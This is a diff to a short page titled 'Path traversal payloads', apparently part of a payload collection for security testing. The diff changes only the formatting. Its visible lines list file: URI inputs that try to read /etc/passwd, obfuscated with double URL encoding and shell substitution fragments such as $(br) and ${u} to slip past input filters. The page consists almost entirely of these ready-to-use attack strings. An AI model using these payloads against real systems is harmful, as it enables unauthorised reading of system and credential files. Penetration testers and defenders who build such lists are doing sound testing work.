@@ -1,8 +1,8 @@
 
+<h1 align="center">Path traversal payloads</h1>
+## /etc/passwd
 
-#/etc/passwd
-
-<code>
+<pre><code>
 file:/etc/passwd?/
 file:/etc/passwd%3F/
 file:/etc%252Fpasswd/
@@ -16,4 +16,4 @@ file:$(br)/et$(u)c%252Fpas$(te)swd?/
 file:${br}/et${u}c%252Fpas${te}swd%3F/
 file:$(br)/et$(u)c%252Fpas$(te)swd%3F/
 file:///etc/passwd?/../passwd
-</code>
+</code></pre>
